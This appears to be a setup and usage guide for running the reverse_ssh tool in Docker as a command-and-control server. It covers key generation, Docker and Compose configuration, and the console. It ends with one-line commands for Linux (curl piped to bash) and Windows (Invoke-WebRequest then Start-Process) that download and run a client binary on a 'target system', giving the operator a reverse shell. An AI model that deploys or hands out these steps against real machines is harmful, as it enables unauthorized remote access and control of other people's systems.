# Requirements

- Server

---

# Setup Guide

### Step 1: Clone the Repository

1. Download the reverse SSH repository:
```
git clone https://github.com/NHAS/reverse_ssh.git
```

### Step 2: Generate an SSH Key Pair

1. Run the following command to create a new SSH key pair:
```
ssh-keygen -t rsa -b 4096 -C "email@gmail.com"
```

### Step 3: Get the Server IP Address

1. Retrieve your server's IP address:
```
ip a
```

### Step 4: Run Reverse SSH with Docker

1. Start the Docker container using your server's IP on port `3232`:
```
docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232 -e SEED_AUTHORIZED_KEYS="$(cat $HOME/.ssh/id_rsa.pub)" -v ./data:/data reversessh/reverse_ssh
```

### Alternative: Run Reverse SSH with Docker Compose

1. Use the following `docker-compose.yml` configuration:
```
services:
 reversessh:
   image: reversessh/reverse_ssh
   ports:
     - "3232:2222"
   environment:
     - EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232
     - RSSH_CONSOLE_LABEL=c2.label
     - RSSH_LOG_LEVEL=INFO # DISABLED, INFO, WARNING, ERROR, FATAL
     - SEED_AUTHORIZED_KEYS=${SSH_PUBLIC_KEY}
   volumes:
     - ./data:/data
```

---

# Usage

### Step 1: Connect to the Server Console

```
ssh your.rssh.server.internal -p 3232
```

### Step 2: List Available Commands

```
help
```

### Step 3: Build a New Client and Host on the Web Server
#### Linux Client
1. Create a executable for windows
```
link
```
2. Download and execute the binary on a target system:
```
curl http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25.sh | bash
```

#### Windows Client
1. Create a executable for windows
```
link --goos windows
```
2. Download and execute the binary on Windows:
```
Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\test.exe
```
